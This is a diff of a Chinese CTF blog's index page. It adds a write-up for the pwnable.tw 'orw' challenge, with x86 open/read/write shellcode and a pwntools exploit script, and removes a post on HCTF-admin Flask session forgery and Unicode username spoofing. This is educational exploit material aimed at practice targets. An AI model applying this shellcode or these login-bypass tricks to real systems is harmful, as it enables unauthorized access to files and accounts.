@@ -246,10 +246,10 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-start" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-pwnable_orw" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/10/11/start/" class="article-date">
+      <a href="/2020/10/11/pwnable_orw/" class="article-date">
       <time datetime="2020-10-11T07:00:00.000Z" itemprop="datePublished">2020-10-11</time>
 </a>
 
@@ -265,7 +265,85 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/11/start/">pwnable.tw start</a>
+      <a class="article-title" href="/2020/10/11/pwnable_orw/">pwnable.tw orw</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>程序开了沙箱，只能使用open，read，write函数。因此整个流程就是先打开文件，然后读取内容，最后把内容打印出来。</p>
+<p>这里需要了解每一个系统调用的参数设置。</p>
+<h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><p>eax = 0x05 系统调用号</p>
+<p>ebx = filename 文件名</p>
+<p>ecx = flags 置零即可</p>
+<p>edx = mode 置零即可</p>
+<p><strong>返回值</strong>eax = fd</p>
+<h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><p>eax = 0x03  系统调用号</p>
+<p>ebx = fd 文件指针</p>
+<p>ecx = buf 缓冲区，存访读取内容</p>
+<p>edx = len 读取的字节数</p>
+<h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>eax = 0x04  系统调用号</p>
+<p>ebx = fd  文件指针，标准输出对应1</p>
+<p>ecx = buf</p>
+<p>edx = len</p>
+<p>因此最终写出shellcode如下（需要注意的是文件名如何赋值）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx;</span><br><span class="line">push ecx;</span><br><span class="line">push 0x67616c66;</span><br><span class="line">push 0x2f77726f;</span><br><span class="line">push 0x2f656d6f;</span><br><span class="line">push 0x682f2f2f;</span><br><span class="line">mov ebx, esp;</span><br><span class="line">xor edx, edx;</span><br><span class="line">mov eax, 5;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">mov ebx, eax;</span><br><span class="line">mov ecx, esp;</span><br><span class="line">mov edx, 0x30;</span><br><span class="line">mov eax, 3;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">mov ebx, 1;</span><br><span class="line">mov edx, 0x30;</span><br><span class="line">mov eax, 4;</span><br><span class="line">int 0x80;</span><br></pre></td></tr></table></figure>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx, ecx;</span></span><br><span class="line"><span class="string">push ecx;</span></span><br><span class="line"><span class="string">push 0x67616c66;</span></span><br><span class="line"><span class="string">push 0x2f77726f;</span></span><br><span class="line"><span class="string">push 0x2f656d6f;</span></span><br><span class="line"><span class="string">push 0x682f2f2f;</span></span><br><span class="line"><span class="string">mov ebx, esp;</span></span><br><span class="line"><span class="string">xor edx, edx;</span></span><br><span class="line"><span class="string">mov eax, 5;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, eax;</span></span><br><span class="line"><span class="string">mov ecx, esp;</span></span><br><span class="line"><span class="string">mov edx, 0x30;</span></span><br><span class="line"><span class="string">mov eax, 3;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, 1;</span></span><br><span class="line"><span class="string">mov edx, 0x30;</span></span><br><span class="line"><span class="string">mov eax, 4;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./orw')</span></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-pwnable_start" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/11/pwnable_start/" class="article-date">
+      <time datetime="2020-10-11T07:00:00.000Z" itemprop="datePublished">2020-10-11</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/11/pwnable_start/">pwnable.tw start</a>
     </h1>
   
 
@@ -945,83 +1023,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-HCTF-admin" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/05/05/HCTF-admin/" class="article-date">
-      <time datetime="2020-05-05T07:00:00.000Z" itemprop="datePublished">2020-05-05</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/05/HCTF-admin/">HCTF-admin</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>参考文献</p>
-<ol>
-<li><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/100733581</a> </li>
-<li><a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener">https://www.jianshu.com/p/f92311564ad0</a> </li>
-<li><a href="https://www.cnblogs.com/chrysanthemum/p/11722351.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11722351.html</a> </li>
-</ol>
-<p>从题目中我们可以找到github源码<a href="https://github.com/woadsl1234/hctf_flask" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask</a></p>
-<p>这里可能需要学习一下flask框架<a href="https://www.w3cschool.cn/flask/" target="_blank" rel="noopener">w3cschool</a></p>
-<p>三种解法</p>
-<h3 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask session 伪造"></a>flask session 伪造</h3><p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。<br> 具体参考:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.leavesongs.com%2FPENETRATION%2Fclient-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
-<p>SECRET_KEY可以在config.py中获取 —— ckj123</p>
-<p>flask中的session的加密和解密可以在<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a> 这里获取到</p>
-<p>对于原先的session先进行解密，修改name后再次加密，然后修改本地session即可。</p>
-<h3 id="Unicode-欺骗"><a href="#Unicode-欺骗" class="headerlink" title="Unicode 欺骗"></a>Unicode 欺骗</h3><p>观察到函数strlower()在register以及change，login中出现了，而且是针对name的处理。</p>
-<p>strlower实际调用的是nodeprep.prepare函数，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现<code>Twisted==10.2.0</code>，而官网最新已经到了19.7.0(2019/9)，版本差距很大，应该会存在漏洞。 可以参考<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpaper.tuisec.win%2Fdetail%2Fa9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a> </p>
-<p>示例</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</span><br></pre></td></tr></table></figure>
-<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>之后再说</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/flask/" rel="tag">flask</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/unicode%E6%AC%BA%E9%AA%97/" rel="tag">unicode欺骗</a></li></ul>
     </div>
 
       
